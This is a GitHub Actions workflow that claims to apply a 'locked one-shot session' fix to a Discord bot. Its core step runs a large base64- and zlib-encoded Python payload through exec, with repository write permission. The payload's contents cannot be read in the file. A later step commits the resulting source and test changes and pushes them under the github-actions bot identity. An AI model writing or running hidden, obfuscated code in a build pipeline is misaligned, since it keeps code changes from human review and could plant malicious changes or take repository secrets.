name: Apply locked one-shot session

on:
  pull_request:
    branches: [main]
    paths:
      - .github/workflows/apply-one-shot-session-lock.yml

permissions:
  contents: write

jobs:
  apply:
    if: github.event.pull_request.head.ref == 'ss' && github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ss
          fetch-depth: 0
          show-progress: false

      - uses: actions/setup-node@v4
        with:
          node-version-file: bot/.node-version
          cache: npm
          cache-dependency-path: bot/package-lock.json

      - name: Apply locked session integration
        shell: bash
        run: |
          python3 - <<'PY'
          import base64
          import zlib
          payload = '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'
          exec(compile(zlib.decompress(base64.b64decode(payload)).decode(), 'apply-one-shot-session-lock', 'exec'))
          PY

      - name: Install and validate
        working-directory: bot
        run: |
          npm ci --ignore-scripts --no-fund --no-audit
          npm rebuild better-sqlite3 --foreground-scripts
          npm test
          npm run check

      - name: Commit source and regression tests
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add bot/src/discord-runner.js bot/test/runner-modes.node-test.js bot/test/quest-status-redesign.node-test.js
          git commit -m "fix: lock one-shot quest manifest and completion attribution"
          git push origin HEAD:ss
